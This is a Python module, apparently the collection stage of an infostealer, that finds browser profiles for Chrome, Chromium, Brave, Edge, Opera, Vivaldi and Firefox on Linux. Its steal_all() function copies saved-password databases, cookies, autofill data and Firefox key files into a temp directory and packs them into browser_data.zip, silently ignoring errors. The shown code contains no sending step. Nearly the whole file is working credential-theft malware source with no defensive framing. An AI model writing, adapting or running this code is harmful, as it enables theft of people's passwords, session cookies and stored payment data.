import os
import json
import shutil
import zipfile
import tempfile
import sqlite3
import platform


BROWSER_PATHS = {
    "chrome": [
        "~/.config/google-chrome/Default",
        "~/.config/google-chrome-beta/Default",
        "~/.config/google-chrome-unstable/Default",
    ],
    "chromium": [
        "~/.config/chromium/Default",
        "~/.config/chromium/Default",
    ],
    "brave": [
        "~/.config/BraveSoftware/Brave-Browser/Default",
    ],
    "edge": [
        "~/.config/microsoft-edge/Default",
        "~/.config/microsoft-edge-beta/Default",
    ],
    "opera": [
        "~/.config/opera",
        "~/.config/opera-beta",
    ],
    "vivaldi": [
        "~/.config/vivaldi/Default",
    ],
    "firefox": [
        "~/.mozilla/firefox/*.default*",
        "~/.mozilla/firefox/*.default-release*",
        "~/.var/app/org.mozilla.firefox/.mozilla/firefox/*.default*",
    ],
}

STEAL_FILES = {
    "chrome": ["Login Data", "Cookies", "Web Data", "Local State"],
    "chromium": ["Login Data", "Cookies", "Web Data", "Local State"],
    "brave": ["Login Data", "Cookies", "Web Data", "Local State"],
    "edge": ["Login Data", "Cookies", "Web Data", "Local State"],
    "opera": ["Login Data", "Cookies", "Web Data", "Local State"],
    "vivaldi": ["Login Data", "Cookies", "Web Data", "Local State"],
    "firefox": ["logins.json", "key4.db", "cookies.sqlite", "places.sqlite"],
}


def _expand_all(patterns):
    import glob
    results = []
    for p in patterns:
        expanded = glob.glob(os.path.expanduser(p))
        results.extend(expanded)
    return results


def _find_browser_dirs():
    found = {}
    for name, patterns in BROWSER_PATHS.items():
        dirs = _expand_all(patterns)
        valid = [d for d in dirs if os.path.isdir(d)]
        if valid:
            found[name] = valid
    return found


def _copy_browser_data(browser_name, profile_dirs, dest_dir):
    files_to_copy = STEAL_FILES.get(browser_name, [])
    copied = []
    for profile in profile_dirs:
        profile_name = os.path.basename(profile)
        out = os.path.join(dest_dir, browser_name, profile_name)
        os.makedirs(out, exist_ok=True)
        for fname in files_to_copy:
            src = os.path.join(profile, fname)
            if os.path.isfile(src):
                try:
                    shutil.copy2(src, os.path.join(out, fname))
                    copied.append(f"{browser_name}/{profile_name}/{fname}")
                except Exception:
                    pass
    return copied


def steal_all():
    temp_dir = tempfile.mkdtemp(prefix="brw_")
    summary = {}

    try:
        browsers = _find_browser_dirs()
        for name, dirs in browsers.items():
            copied = _copy_browser_data(name, dirs, temp_dir)
            if copied:
                summary[name] = copied

        if not summary:
            shutil.rmtree(temp_dir, ignore_errors=True)
            return None

        zip_path = os.path.join(tempfile.gettempdir(), "browser_data.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, _dirs, files in os.walk(temp_dir):
                for f in files:
                    fp = os.path.join(root, f)
                    arcname = os.path.relpath(fp, temp_dir)
                    zf.write(fp, arcname)

        shutil.rmtree(temp_dir, ignore_errors=True)
        return zip_path

    except Exception:
        shutil.rmtree(temp_dir, ignore_errors=True)
        return None
